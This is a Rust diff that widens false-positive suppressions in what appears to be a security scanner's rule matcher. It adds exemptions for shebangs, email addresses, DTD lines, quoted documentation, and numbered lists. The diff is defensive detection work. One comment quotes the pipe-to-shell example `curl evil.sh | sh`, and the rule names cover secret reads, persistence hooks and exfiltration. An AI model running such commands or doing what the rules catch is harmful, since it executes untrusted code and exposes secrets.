@@ -614,7 +614,9 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
                 || !looks_like_base64(&m, &line)
         }
         // Benign device files are not sensitive system paths. The match is only
-        // `/dev/`, so the check has to look at the whole line (GOLD-v3).
+        // `/dev/`, so the check has to look at the whole line (GOLD-v3). A
+        // relative path (`build/bin/x.js`) and a shebang (`#!/usr/bin/env`) are
+        // not absolute accesses (GOLD-v5).
         "FS_ABSOLUTE_PATH" => {
             line.contains("/dev/null")
                 || line.contains("/dev/stdout")
@@ -624,6 +626,13 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
                 || line.contains("/dev/zero")
                 || line.contains("/dev/urandom")
                 || line.contains("/dev/random")
+                || line.contains("#!/")
+                || raw_line.find(matched).is_some_and(|i| {
+                    raw_line[..i]
+                        .chars()
+                        .next_back()
+                        .is_some_and(|c| c.is_alphanumeric())
+                })
         }
         "NET_DOMAIN_LITERAL" => {
             let trimmed = raw_line.trim_start();
@@ -637,6 +646,11 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
             ];
             let url_context = line.contains("://") || line.contains("www.") || line.contains('@');
             (AMBIGUOUS.iter().any(|t| m.ends_with(t)) && !url_context)
+                // An email address (`x@gmail.com`) is not a contacted host, and a
+                // DTD identifier is not a URL (GOLD-v5).
+                || raw_line.find(matched).is_some_and(|i| raw_line[..i].ends_with('@'))
+                || line.contains("doctype")
+                || line.contains("public \"")
                 // XML namespaces (`xmlns="http://schemas..."`) are identifiers,
                 // not network calls, and a URL in a comment is documentation.
                 || line.contains("xmlns")
@@ -682,7 +696,9 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
         // "The skill writes agent configuration" needs a write. A line that only
         // names the path — a helper, a read, a commented example — is not a
         // write, and GOLD-v2 found every sampled PERSIST_* finding was one.
-        "PERSIST_AGENT_CONFIG" | "PERSIST_SHELL_RC" => !writes_to(&line, &m),
+        "PERSIST_AGENT_CONFIG" | "PERSIST_SHELL_RC" => {
+            !writes_to(&line, &m) || is_documentation_or_quoted(raw_line, matched)
+        }
         // `--index-url https://pypi.org/simple` is the default registry, not a
         // custom one.
         "DEP_CUSTOM_REGISTRY" => {
@@ -690,6 +706,7 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
                 || line.contains("registry.npmjs.org")
                 || line.contains("registry.yarnpkg.com")
                 || line.contains("crates.io")
+                || is_documentation_or_quoted(raw_line, matched)
         }
         // A test asserts *about* a pattern; it does not perform it. GOLD-v4:
         // `expect(tokenizeArgs("... curl evil.sh | sh"))` and
@@ -697,7 +714,9 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
         // reported as a pipe-to-shell and as a destructive command.
         "DL_PIPE_TO_SHELL" | "SHELL_DESTRUCTIVE" | "SHELL_EVAL" | "NET_HTTP_CLIENT"
         | "NET_FETCH_CALL" | "PERSIST_CRON" | "SECRET_PATH_READ" => {
-            looks_like_test(&line) || looks_like_usage(&line)
+            looks_like_test(&line)
+                || looks_like_usage(&line)
+                || is_documentation_or_quoted(raw_line, matched)
         }
         // The canonical AWS documentation key is not a credential. GOLD-v5: two
         // of three findings were `AKIAIOSFODNN7EXAMPLE` in a doc table.
@@ -716,7 +735,8 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
         "PI_CONCEALMENT"
         | "PI_EXFIL_INSTRUCTION"
         | "PI_INJECTION_OVERRIDE"
-        | "PI_SYSTEM_IMPERSATION" => {
+        | "PI_SYSTEM_IMPERSATION"
+        | "PERSIST_HOOK" => {
             is_documentation_or_quoted(raw_line, matched) || discusses_the_attack(&line)
         }
         _ => false,
@@ -779,10 +799,13 @@ fn is_documentation_or_quoted(line: &str, matched: &str) -> bool {
 
 /// Does the line document how to run something (a usage line in a docstring)?
 fn looks_like_usage(line: &str) -> bool {
+    let t = line.trim_start();
     line.contains("usage:")
         || line.contains("用法")
         || line.contains("示例")
         || line.contains("example:")
+        // A numbered documentation list (`3. Credential files (...)`).
+        || (t.chars().next().is_some_and(|c| c.is_ascii_digit()) && t.contains(". "))
         || ((line.contains("python") || line.contains("node") || line.contains("sh "))
             && line.contains('<')
             && line.contains('>'))
